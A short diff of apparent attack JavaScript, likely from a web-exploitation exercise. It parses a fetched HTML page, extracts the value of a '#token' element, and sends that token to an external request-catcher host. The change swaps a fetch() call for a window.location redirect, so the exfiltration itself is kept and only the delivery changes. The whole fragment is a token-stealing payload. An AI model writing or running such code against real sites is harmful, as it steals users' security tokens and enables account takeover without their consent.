@@ -6,7 +6,7 @@ const parser = new DOMParser();
 const doc = parser.parseFromString(resp, "text/html");
 const token = doc.querySelector('#token').value;
 
-fetch(`https://tyyhty.requestcatcher.com/${token}`)
+window.location.href = `https://tyyhty.requestcatcher.com/${token}`
 
 
 
